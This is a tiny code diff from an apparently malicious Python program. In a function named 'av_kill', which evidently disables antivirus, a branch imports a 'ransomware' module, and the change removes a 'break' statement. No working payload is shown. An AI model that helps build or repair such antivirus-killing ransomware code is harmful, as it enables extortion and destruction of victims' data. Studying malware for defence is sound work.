@@ -19,7 +19,6 @@ def av_kill():
             pass
         else:
             import ransomware
-            break
 
 
 def main():
